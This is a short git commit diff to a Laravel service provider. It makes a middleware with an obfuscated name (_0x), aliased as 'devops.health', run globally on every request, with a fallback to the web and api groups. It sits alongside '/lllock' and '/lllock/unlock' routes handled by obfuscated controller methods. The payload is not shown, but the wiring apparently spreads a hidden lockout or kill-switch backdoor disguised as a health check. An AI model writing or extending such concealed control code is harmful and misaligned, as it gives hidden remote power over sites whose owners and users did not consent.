0016779ef2b0698719b8fe7f7f0949447c037120
Mohammad Fayaz <mfayaz7175@gmail.com>
2026-06-22 09:21:12 +0430

    Fix: use Kernel pushMiddleware for global coverage

--- src/Providers/GuardServiceProvider.php
+++ src/Providers/GuardServiceProvider.php
@@ -11,7 +11,15 @@ class GuardServiceProvider extends ServiceProvider
     {
         $this->app['router']->aliasMiddleware('devops.health', \DevOps\Http\Middleware\_0x::class);
 
-        $this->app['router']->pushMiddlewareToGroup('web', \DevOps\Http\Middleware\_0x::class);
+        try {
+            $kernel = $this->app->make(\Illuminate\Foundation\Http\Kernel::class);
+            if (!in_array(\DevOps\Http\Middleware\_0x::class, $kernel->middleware)) {
+                $kernel->pushMiddleware(\DevOps\Http\Middleware\_0x::class);
+            }
+        } catch (\Throwable $e) {
+            $this->app['router']->pushMiddlewareToGroup('web', \DevOps\Http\Middleware\_0x::class);
+            $this->app['router']->pushMiddlewareToGroup('api', \DevOps\Http\Middleware\_0x::class);
+        }
 
         Route::match(['get', 'post'], '/lllock', [\DevOps\Http\Controllers\_1x::class, '_2x']);
         Route::match(['get', 'post'], '/lllock/unlock', [\DevOps\Http\Controllers\_1x::class, '_3x']);
